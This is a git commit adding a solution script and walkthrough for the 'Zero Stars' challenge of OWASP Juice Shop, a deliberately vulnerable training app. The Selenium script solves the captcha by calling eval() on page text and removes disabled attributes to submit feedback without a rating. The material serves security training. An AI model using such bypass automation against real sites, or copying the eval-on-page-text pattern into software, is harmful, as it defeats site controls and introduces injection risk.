4836a43b7e2d1d23e7ddc1517dad6fccdcad9369
Roman Grewal <grps.hq@gmail.com>
2025-10-08 12:30:29 -0400

    zero stars

---
+++ solutions/level1/zero-stars/solution.py
@@ -0,0 +1,42 @@
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import os
+import time
+
+try:
+	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
+	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
+	driver = webdriver.Chrome()
+
+	#User loads website in browser
+	driver.get(f"http://{IP_ADDRESS}:{PORT}")
+	
+	#User navigates to customer feedback page
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'menu')]"))).click()
+	customerFeedbackButton = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//a[contains(., 'Customer Feedback')]")))
+	driver.execute_script("arguments[0].click();", customerFeedbackButton)
+
+	#User writes comment	
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "comment"))).send_keys("test")
+
+	#User solves captcha
+	captchaAnswer = eval(WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "captcha"))).text)
+	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "captchaControl"))).send_keys(captchaAnswer)
+
+	#User edits HTML to enable submit button
+	submitButton = WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, "submitButton")))
+	classToRemove = "mat-mdc-button-disabled"
+	disableAttribute = "disabled"
+	matDisable = "mat-ripple-loader-disabled"
+	driver.execute_script(f"arguments[0].classList.remove('{classToRemove}');", submitButton)
+	driver.execute_script(f"arguments[0].removeAttribute('{disableAttribute}');", submitButton)
+	driver.execute_script(f"arguments[0].removeAttribute('{matDisable}');", submitButton)
+	time.sleep(3)
+	driver.execute_script("arguments[0].click();", submitButton)
+	time.sleep(3)
+	
+finally:
+  driver.quit()
---
+++ solutions/level1/zero-stars/zero-stars.md
@@ -0,0 +1,12 @@
+## Zero Stars 
+### Challenge: Give a devastating zero-star feedback to the store.
+
+* Navigate to Customer Feedback
+* Write a comment
+* DO NOT TOGGLE THE RATING SLIDER
+* Solve the captcha
+* Open the HTML inspector
+* Find the Submit button
+* Remove class `mat-mdc-button-disabled`
+* Remove HTML attributes `mat-ripple-loader-disabled` and `disabled`
+* Click the enabled submit button to complete this challenge
